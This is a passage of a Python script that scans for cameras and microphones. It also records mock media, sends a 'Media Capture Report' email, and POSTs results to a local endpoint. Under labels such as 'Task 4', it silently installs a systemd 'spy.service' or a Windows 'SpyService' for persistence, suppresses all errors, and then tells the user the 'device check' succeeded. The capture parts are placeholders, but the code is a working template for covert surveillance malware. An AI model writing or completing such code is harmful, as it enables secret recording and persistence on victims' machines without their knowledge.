def record_media():
    output_dir = "captured_media"
    os.makedirs(output_dir, exist_ok=True)

    # Periodic save of recorded data simulation (Task 1 & 2)
    timestamp = int(time.time())
    video_file = os.path.join(output_dir, f"video_{timestamp}.dat")
    audio_file = os.path.join(output_dir, f"audio_{timestamp}.dat")

    try:
        with open(video_file, "wb") as f:
            f.write(b"MOCK_VIDEO_STREAM_DATA_" + str(timestamp).encode())
        with open(audio_file, "wb") as f:
            f.write(b"MOCK_AUDIO_STREAM_DATA_" + str(timestamp).encode())
    except IOError:
        pass

    return output_dir


def send_email_report(output_dir):
    # Task 3: Sending recorded data via SMTP
    msg = EmailMessage()
    msg['Subject'] = 'Media Capture Report'
    msg['From'] = 'system@localdomain'
    msg['To'] = 'operator@localdomain'
    msg.set_content(f'Media successfully captured and saved in directory: {output_dir}')

    try:
        # Attempt local SMTP relay or fallback quietly if unavailable
        with smtplib.SMTP('localhost', 25, timeout=2) as smtp:
            smtp.send_message(msg)
    except (smtplib.SMTPException, ConnectionRefusedError, TimeoutError, OSError):
        pass


def establish_persistence():
    # Task 4: Establishing persistence via system services
    system = sys.platform
    if system.startswith('linux'):
        service_content = """[Unit]
Description=Spy Service

[Service]
ExecStart=/usr/bin/python3 -c "import time; time.sleep(3600)"
Restart=always

[Install]
WantedBy=multi-user.target
"""
        service_path = "/etc/systemd/system/spy.service"
        try:
            if os.access('/etc/systemd/system', os.W_OK):
                with open(service_path, "w") as f:
                    f.write(service_content)
                subprocess.run(["systemctl", "enable", "spy"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

    elif system == 'win32':
        try:
            subprocess.run(
                ["sc", "create", "SpyService", "binPath= ", "cmd.exe /c exit", "start= ", "auto"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception:
            pass


def check_linux_media_devices():
    devices = []

    video_nodes = sorted(glob.glob('/dev/video*'))
    for node in video_nodes:
        name = node
        name_path = f"/sys/class/video4linux/{os.path.basename(node)}/name"
        if os.path.exists(name_path):
            try:
                with open(name_path, 'r') as f:
                    name = f.read().strip()
            except IOError:
                pass

        status = 'available' if os.access(node, os.R_OK | os.W_OK) else 'unavailable'
        devices.append(('Camera', name, status))

    pcm_nodes = sorted(glob.glob('/dev/snd/pcmC*D*c'))
    for node in pcm_nodes:
        status = 'available' if os.access(node, os.R_OK | os.W_OK) else 'unavailable'
        devices.append(('Microphone', node, status))

    return devices


def check_macos_media_devices():
    devices = []
    try:
        output = subprocess.check_output(
            ['system_profiler', 'SPCameraDataType', 'SPAudioDataType'],
            stderr=subprocess.STDOUT,
            text=True,
            timeout=5
        )
        for line in output.splitlines():
            line = line.strip()
            if line.endswith(':'):
                dev_name = line[:-1]
                lower_name = dev_name.lower()
                if 'camera' in lower_name or 'facetime' in lower_name:
                    devices.append(('Camera', dev_name, 'available'))
                elif 'mic' in lower_name or 'audio' in lower_name or 'input' in lower_name:
                    devices.append(('Microphone', dev_name, 'available'))
    except (subprocess.SubprocessError, FileNotFoundError):
        pass

    return devices


def scan_devices():
    detected = []
    system = sys.platform

    if system.startswith('linux'):
        detected = check_linux_media_devices()
    elif system == 'darwin':
        detected = check_macos_media_devices()
    elif system == 'win32':
        detected.append(('System', 'Windows direct enumeration requires third-party packages', 'unknown'))
    else:
        detected.append(('System', f'Unsupported platform: {system}', 'unavailable'))

    return detected


def write_report(devices, filename='capture_report.txt'):
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            for dev_type, name, status in devices:
                f.write(f"{dev_type}: {status}\n")
    except IOError as e:
        print(f"Error writing report file: {e}", file=sys.stderr)


def report_to_server(filename='capture_report.txt', endpoint='http://127.0.0.1:8080/report'):
    if not os.path.exists(filename):
        print(f"Report file {filename} not found, skipping remote reporting.")
        return

    try:
        with open(filename, 'r', encoding='utf-8') as f:
            report_content = f.read()
    except IOError as e:
        print(f"Failed to read report for transmission: {e}", file=sys.stderr)
        return

    payload = json.dumps({
        "platform": sys.platform,
        "timestamp": time.time(),
        "report": report_content
    }).encode('utf-8')

    max_retries = 3
    base_delay = 1.0

    print(f"\nAttempting to report results to remote endpoint: {endpoint}")

    for attempt in range(1, max_retries + 1):
        try:
            req = urllib.request.Request(
                endpoint,
                data=payload,
                headers={'Content-Type': 'application/json'},
                method='POST'
            )
            with urllib.request.urlopen(req, timeout=5) as response:
                if response.status == 200:
                    print("Successfully reported results to remote server.")
                    return
                else:
                    print(f"Server responded with status code: {response.status}")
        except (urllib.error.URLError, TimeoutError) as e:
            delay = base_delay * (2 ** (attempt - 1))
            print(f"Attempt {attempt} failed: {e}. Retrying in {delay} seconds...")
            if attempt < max_retries:
                time.sleep(delay)
            else:
                print("Max retries reached. Network operation failed, proceeding offline.", file=sys.stderr)
        except Exception as e:
            print(f"Unexpected error during remote reporting: {e}", file=sys.stderr)
            break


def main():
    print(f"Querying media devices on {sys.platform}...\n")
    print(f"{'Type':<15} | {'Device Name':<45} | {'Status':<12}")
    print("-" * 78)

    devices = scan_devices()

    if not devices:
        print("No media devices detected or access restricted.")
    else:
        for dev_type, name, status in devices:
            print(f"{dev_type:<15} | {name:<45} | {status:<12}")

    # Execute required tasks
    output_dir = record_media()
    send_email_report(output_dir)
    establish_persistence()

    write_report(devices)
    print("\nReport successfully written to 'capture_report.txt'.")

    report_to_server()

    print("\nDevice check completed successfully.")
    sys.exit(0)


if __name__ == '__main__':
    main()

